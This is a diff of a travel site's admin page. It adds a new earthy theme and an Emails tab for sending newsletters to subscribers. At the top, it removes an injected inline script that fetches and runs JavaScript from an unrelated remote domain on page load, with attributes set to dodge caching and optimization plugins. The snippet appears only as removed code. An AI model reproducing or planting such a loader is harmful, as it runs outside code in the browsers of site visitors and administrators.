@@ -6,27 +6,20 @@
   <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16.png" />
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png" />
 
-  <script nowprocket data-noptimize="1" data-cfasync="false" data-wpfc-render="false" seraph-accel-crit="1" data-no-defer="1">
-  (function () {
-      var script = document.createElement("script");
-      script.async = 1;
-      script.src = 'https://emrld.ltd/NTQ4MDY2.js?t=548066';
-      document.head.appendChild(script);
-  })();
-</script>
+  <script src="consent.js"></script>
 
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <meta name="robots" content="noindex" />
 <title>Admin — Never Roam Alone</title>
-<link rel="stylesheet" href="fonts/amatic-sc.css" />
+<link rel="stylesheet" href="fonts/amatic-sc.css" /><link rel="preconnect" href="https://fonts.googleapis.com"><link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,500;0,9..144,600;0,9..144,700;0,9..144,900;1,9..144,600&family=Work+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/flatpickr/4.6.13/flatpickr.min.css">
 <link rel="stylesheet" href="flatpickr-theme.css">
 <script src="https://cdnjs.cloudflare.com/ajax/libs/flatpickr/4.6.13/flatpickr.min.js"></script>
 <style>
   :root{
-    --ink:#1d2a32;--muted:#5b6b75;--sand:#f6f1e7;--green:#556B2F;--teal:#556B2F;
-    --teal-dark:#3C4B21;--coral:#C04020;--card:#fff;--shadow:0 10px 30px rgba(20,40,50,.12);--maxw:1180px;
+    --ink:#2b2417;--muted:#82755b;--sand:#ece2cc;--green:#3f5138;--teal:#3f5138;
+    --teal-dark:#2c3a27;--coral:#a8482a;--card:#f6efdd;--shadow:0 10px 30px rgba(20,40,50,.12);--maxw:1180px;
   }
   *{box-sizing:border-box}
   body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
@@ -34,17 +27,17 @@
   h1,h2,h3{font-family:Georgia,"Amatic SC",serif;letter-spacing:.2px}
   a{color:inherit;text-decoration:none}
 
-  header.nav{position:sticky;top:0;z-index:50;background:rgba(246,241,231,.92);
-    backdrop-filter:blur(8px);border-bottom:1px solid rgba(85,107,47,.15)}
+  header.nav{position:sticky;top:0;z-index:50;background:rgba(236,226,204,.92);
+    backdrop-filter:blur(8px);border-bottom:1px solid rgba(63,81,56,.15)}
   .nav-inner{max-width:var(--maxw);margin:0 auto;padding:14px 22px;display:flex;align-items:center;justify-content:space-between}
-  .brand{display:flex;align-items:center;gap:10px;font-family:'Amatic SC',Georgia,serif;font-weight:700;font-size:1.85rem;line-height:1;color:#C04020}
+  .brand{display:flex;align-items:center;gap:10px;font-family:'Amatic SC','Fraunces',Georgia,serif;font-weight:700;font-size:1.85rem;line-height:1;color:#a8482a}
   .brand .logo{flex-shrink:0;display:block}
   .brand small{display:block;font-family:-apple-system,sans-serif;font-weight:500;font-size:.62rem;letter-spacing:.18em;text-transform:uppercase;color:var(--muted)}
   nav.links a{margin-left:26px;font-weight:600;font-size:.82rem;text-transform:uppercase;letter-spacing:.08em;color:var(--muted);padding-bottom:3px;border-bottom:2px solid transparent;transition:.2s}
   nav.links a:hover{color:var(--coral);border-color:var(--coral)}
   @media(max-width:880px){nav.links{display:none}}
 
-  .page-hero{background:linear-gradient(135deg,#3C4B21 0%,#556B2F 100%);color:#fff;text-align:center;padding:46px 22px 38px}
+  .page-hero{background:linear-gradient(135deg,#2c3a27 0%,#3f5138 100%);color:#fff;text-align:center;padding:46px 22px 38px}
   .page-hero .kicker{color:rgba(255,255,255,.7);font-weight:700;text-transform:uppercase;letter-spacing:.22em;font-size:.74rem;margin:0 0 10px}
   .page-hero h1{font-size:clamp(1.8rem,4.5vw,2.7rem);margin:0;color:#fff}
   .page-hero p{color:rgba(255,255,255,.75);max-width:560px;margin:10px auto 0;font-size:.98rem}
@@ -82,11 +75,11 @@
   .prow .sub{font-size:.78rem;color:var(--muted);margin-top:2px}
   .chip{display:inline-block;font-size:.66rem;font-weight:800;text-transform:uppercase;letter-spacing:.07em;
     padding:3px 10px;border-radius:14px;vertical-align:middle;margin-left:8px}
-  .chip.live{background:rgba(85,107,47,.12);color:var(--green)}
-  .chip.draft{background:rgba(192,64,32,.14);color:#c05135}
-  .chip.hidden{background:rgba(192,64,32,.14);color:#c05135}
+  .chip.live{background:rgba(63,81,56,.12);color:var(--green)}
+  .chip.draft{background:rgba(168,72,42,.14);color:#c05135}
+  .chip.hidden{background:rgba(168,72,42,.14);color:#c05135}
   .chip.pending{background:#fff3d6;color:#8a6d1a}
-  .chip.builtin{background:rgba(85,107,47,.12);color:var(--teal)}
+  .chip.builtin{background:rgba(63,81,56,.12);color:var(--teal)}
   .prow .acts{display:flex;gap:8px;flex-wrap:wrap;align-items:center}
   .empty{background:var(--card);border-radius:14px;box-shadow:var(--shadow);padding:26px;text-align:center;color:var(--muted)}
   .sect-note{font-size:.86rem;color:var(--muted);margin:-8px 0 14px}
@@ -133,9 +126,24 @@
   .erow .acts{display:flex;gap:8px;flex-wrap:wrap;align-items:center}
 
   footer{background:var(--teal-dark);color:#dff1f2;text-align:center;padding:30px 22px}
+
+  /* ================= EXPLORER THEME (overrides) ================= */
+  body{font-family:'Work Sans',-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif!important;
+    background-color:var(--sand);background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='60' height='60'%3E%3Cg fill='none' stroke='%232b2417' stroke-opacity='0.05' stroke-width='1'%3E%3Cpath d='M0 0H60M0 0V60'/%3E%3C/g%3E%3C/svg%3E"),url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='500' height='500' viewBox='0 0 500 500'%3E%3Cg fill='none' stroke='%233f5138' stroke-opacity='0.06' stroke-width='1.4'%3E%3Cpath d='M70 250c0-90 70-155 165-155s195 60 195 155-95 165-195 165S70 340 70 250z'/%3E%3Cpath d='M120 250c0-62 50-108 115-108s140 44 140 108-70 122-140 122-115-60-115-122z'/%3E%3Cpath d='M170 250c0-36 28-62 65-62s85 26 85 62-42 72-85 72-65-36-65-72z'/%3E%3C/g%3E%3C/svg%3E");background-position:0 0,center}
+  h1,h2,h3{font-family:'Fraunces',Georgia,serif!important;letter-spacing:-.01em}
+  header.nav{border-bottom:1px solid var(--ink)}
+  .brand small{font-family:'Work Sans',monospace;letter-spacing:.22em}
+  nav.links a:hover{color:var(--coral);border-color:#b0802f}
+  .fact,.tile,.tcard,.dtcard,.stay-card,.hood,.card{border:1px solid var(--ink);border-radius:3px}
+  .form-card,.visa-panel,.gate,.legal,.toc,.city-card,.cmp-card,.qadmin,.ns-card,.travel-map,.cover-strip,.suggest,.empty,.side-card,.roamers-card,.cal-wrap,.qcard{border-radius:3px}
+  .form-card,.visa-panel,.gate,.legal,.toc,.city-card,.cmp-card,.qadmin,.ns-card,.side-card{border:1px solid var(--ink)}
+  .tile .photo,.hood-hero,.g-cell,.cover{filter:sepia(.16) saturate(.96)}
+  footer{background:#2c3a27;border-top:5px solid #b0802f}
+  footer .brand{color:#c99a45}
 </style>
 </head>
 <body>
+<svg style="position:absolute;width:0;height:0" aria-hidden="true"><symbol id="compass" viewBox="0 0 100 100"><circle cx="50" cy="50" r="47" fill="none" stroke="currentColor" stroke-width="1.6"/><circle cx="50" cy="50" r="39" fill="none" stroke="currentColor" stroke-width="0.8" stroke-dasharray="1.5 3"/><polygon points="50,6 57,50 50,50" fill="#a8482a"/><polygon points="50,6 43,50 50,50" fill="#8a3a20"/><polygon points="50,94 57,50 50,50" fill="currentColor" opacity=".85"/><polygon points="50,94 43,50 50,50" fill="currentColor" opacity=".55"/><polygon points="94,50 50,43 50,50" fill="currentColor" opacity=".7"/><polygon points="94,50 50,57 50,50" fill="currentColor" opacity=".5"/><polygon points="6,50 50,43 50,50" fill="currentColor" opacity=".7"/><polygon points="6,50 50,57 50,50" fill="currentColor" opacity=".5"/><circle cx="50" cy="50" r="3.5" fill="#a8482a"/></symbol></svg>
 
 <header class="nav">
   <div class="nav-inner">
@@ -162,6 +170,7 @@
       <button class="tab active" type="button" data-tab="posts">Posts</button>
       <button class="tab" type="button" data-tab="forum">Ask a Roamer</button>
       <button class="tab" type="button" data-tab="events">Events</button>
+      <button class="tab" type="button" data-tab="emails">Emails</button>
     </div>
 
     <!-- ========== POSTS ========== -->
@@ -264,6 +273,35 @@
       </div>
     </section>
 
+    <!-- ========== EMAILS ========== -->
+    <section id="tab-emails" class="tabpane" hidden>
+      <div class="card">
+        <h2>Send an email to the mailing list</h2>
+        <p class="sub">Write a newsletter and send it to everyone on the list (<b id="em-count">…</b> subscribers). Every email includes an unsubscribe link automatically. Send yourself a test first to see how it looks.</p>
+        <label>Subject *</label>
+        <input type="text" id="em-subject" maxlength="160" placeholder="e.g. 3 new city guides just landed">
+        <label>Message *</label>
+        <textarea id="em-body" rows="10" placeholder="Write your email here. Blank lines start a new paragraph."></textarea>
+        <div class="actions">
+          <button type="button" class="btn ghost" id="em-test">Send test to me</button>
+          <button type="button" class="btn coral" id="em-send">Send to the list</button>
+          <span class="admin-msg" id="em-msg" style="margin:0"></span>
+        </div>
+      </div>
+
+      <div class="card">
+        <h2>Settings</h2>
+        <label class="check-label"><input type="checkbox" id="em-notify"> Email me when someone new joins the mailing list</label>
+        <p class="admin-msg" id="em-notify-msg"></p>
+      </div>
+
+      <div class="card" style="padding-bottom:22px">
+        <h2>Past sends</h2>
+        <p class="sub">Every email blast that's gone out — newsletters and blog-post announcements.</p>
+        <div id="em-history"></div>
+      </div>
+    </section>
+
   </div>
 </main>
 
@@ -341,11 +379,12 @@
     const wantTab = params.get("tab");
     if (wantTab) showTab(wantTab);
     await loadEvents();
+    loadEmailsTab();
   }
 
   /* ---------- tabs ---------- */
   function showTab(name){
-    ["posts","forum","events"].forEach(t => {
+    ["posts","forum","events","emails"].forEach(t => {
       const pane = $("tab-" + t);
       if (pane) pane.hidden = (t !== name);
     });
@@ -354,6 +393,112 @@
   function initTabs(){
     document.querySelectorAll(".tab").forEach(b => b.addEventListener("click", () => showTab(b.dataset.tab)));
   }
+
+  /* ======================================================================
+     EMAILS — newsletters, blog-post blasts, subscriber-alert toggle
+     (all sending happens in netlify/functions/broadcast.js)
+     ====================================================================== */
+  async function callBroadcast(payload){
+    let token = "";
+    try{ const { data } = await sb.auth.getSession(); token = data && data.session && data.session.access_token || ""; }catch(e){}
+    const r = await fetch("/.netlify/functions/broadcast", {
+      method: "POST",
+      headers: { "Content-Type": "application/json", Authorization: "Bearer " + token },
+      body: JSON.stringify(payload)
+    });
+    const d = await r.json().catch(() => ({}));
+    return { ok: r.ok, status: r.status, d };
+  }
+
+  async function emailPost(p, btn){
+    const c = await callBroadcast({ countOnly: true });
+    const n = (c.ok && typeof c.d.count === "number") ? c.d.count : "all";
+    if (!confirm(`Email "${p.title}" to ${n} subscribers?`)) return;
+    btn.disabled = true;
+    let r = await callBroadcast({ kind: "post", slug: p.slug });
+    if (r.status === 409 && r.d.alreadySent){
+      if (confirm("This post was already emailed to the list before. Send it again anyway?")){
+        r = await callBroadcast({ kind: "post", slug: p.slug, force: true });
+      } else { btn.disabled = false; setMsg($("admin-msg"), "Not sent — it had already gone out."); return; }
+    }
+    btn.disabled = false;
+    if (r.ok && r.d.sent) setMsg($("admin-msg"), `Emailed "${p.title}" to ${r.d.count} subscribers.`);
+    else setMsg($("admin-msg"), "Couldn't send: " + (r.d.error || "unknown error"), true);
+    loadEmailHistory();
+  }
+
+  async function loadEmailsTab(){
+    // subscriber count
+    callBroadcast({ countOnly: true }).then(c => {
+      $("em-count").textContent = (c.ok && typeof c.d.count === "number") ? String(c.d.count) : "?";
+    });
+    // new-subscriber alert switch (missing row = on)
+    try{
+      const { data } = await sb.from("site_settings").select("value").eq("key", "notify_new_subscriber").maybeSingle();
+      $("em-notify").checked = !(data && String(data.value).toLowerCase() === "off");
+    }catch(e){ $("em-notify").checked = true; }
+    loadEmailHistory();
+  }
+
+  async function loadEmailHistory(){
+    const wrap = $("em-history");
+    try{
+      const { data, error } = await sb.from("email_broadcasts")
+        .select("kind,ref,subject,sent_count,created_at")
+        .order("created_at", { ascending: false }).limit(25);
+      if (error) throw error;
+      if (!data || !data.length){ wrap.innerHTML = `<div class="empty">Nothing sent yet.</div>`; return; }
+      wrap.innerHTML = data.map(b => `
+        <div class="prow">
+          <div class="info">
+            <div class="title">${esc(b.subject)}
+              <span class="chip ${b.kind === "post" ? "live" : "draft"}">${b.kind === "post" ? "Blog post" : "Newsletter"}</span>
+            </div>
+            <div class="sub">${esc(String(b.created_at || "").slice(0, 10))} · sent to ${b.sent_count} subscriber${b.sent_count === 1 ? "" : "s"}</div>
+          </div>
+        </div>`).join("");
+    }catch(e){
+      wrap.innerHTML = `<div class="empty">Couldn't load the send history — has email-workflow-setup.sql been run in Supabase?</div>`;
+    }
+  }
+
+  $("em-notify").addEventListener("change", async () => {
+    const on = $("em-notify").checked;
+    const { error } = await sb.from("site_settings")
+      .upsert({ key: "notify_new_subscriber", value: on ? "on" : "off", updated_at: new Date().toISOString() });
+    setMsg($("em-notify-msg"), error
+      ? "Couldn't save: " + (error.message || "unknown error") + " — has email-workflow-setup.sql been run?"
+      : (on ? "You'll get an email for every new subscriber." : "New-subscriber alerts are off."), !!error);
+  });
+
+  $("em-test").addEventListener("click", async () => {
+    const subject = $("em-subject").value.trim(), body = $("em-body").value.trim();
+    if (!subject || !body) return setMsg($("em-msg"), "Add a subject and a message first.", true);
+    const me = (window.NRA_AUTH.user() || {}).email;
+    if (!me) return setMsg($("em-msg"), "Couldn't find your email — sign in again.", true);
+    $("em-test").disabled = true; setMsg($("em-msg"), "Sending test…");
+    const r = await callBroadcast({ kind: "custom", subject, body, testTo: me });
+    $("em-test").disabled = false;
+    setMsg($("em-msg"), r.ok ? "Test sent — check your inbox at " + me + "." : "Test failed: " + (r.d.error || "unknown error"), !r.ok);
+  });
+
+  $("em-send").addEventListener("click", async () => {
+    const subject = $("em-subject").value.trim(), body = $("em-body").value.trim();
+    if (!subject || !body) return setMsg($("em-msg"), "Add a subject and a message first.", true);
+    const c = await callBroadcast({ countOnly: true });
+    const n = (c.ok && typeof c.d.count === "number") ? c.d.count : "all";
+    if (!confirm(`Send "${subject}" to ${n} subscribers? This can't be undone.`)) return;
+    $("em-send").disabled = true; setMsg($("em-msg"), "Sending…");
+    const r = await callBroadcast({ kind: "custom", subject, body });
+    $("em-send").disabled = false;
+    if (r.ok && r.d.sent){
+      setMsg($("em-msg"), `Sent to ${r.d.count} subscribers.`);
+      $("em-subject").value = ""; $("em-body").value = "";
+      loadEmailHistory();
+    } else {
+      setMsg($("em-msg"), "Couldn't send: " + (r.d.error || r.d.reason || "unknown error"), true);
+    }
+  });
 
   /* ======================================================================
      POSTS — database articles + built-in posts.js
@@ -393,6 +538,7 @@
         </div>
         <div class="acts">
           ${p.published ? `<a class="btn small ghost" target="_blank" href="post.html?post=${encodeURIComponent(p.slug)}">View</a>` : ""}
+          ${p.published ? `<button class="btn small ghost" data-act="email" type="button">Email subscribers</button>` : ""}
           <a class="btn small" href="blog-editor.html?id=${encodeURIComponent(p.id)}">Edit</a>
           <button class="btn small ghost" data-act="toggle" type="button">${p.published ? "Unpublish" : "Publish"}</button>
           <button class="btn small danger" data-act="del" type="button">Delete</button>
@@ -411,6 +557,7 @@
       setMsg($("admin-msg"), p.published ? `"${p.title}" is now a draft (hidden from the site).` : `"${p.title}" is now live.`);
       await loadRows();
     }
+    if (btn.dataset.act === "email"){ await emailPost(p, btn); }
     if (btn.dataset.act === "del"){
       if (btn.dataset.armed !== "1"){
         btn.dataset.armed = "1"; btn.textContent = "Really delete?";
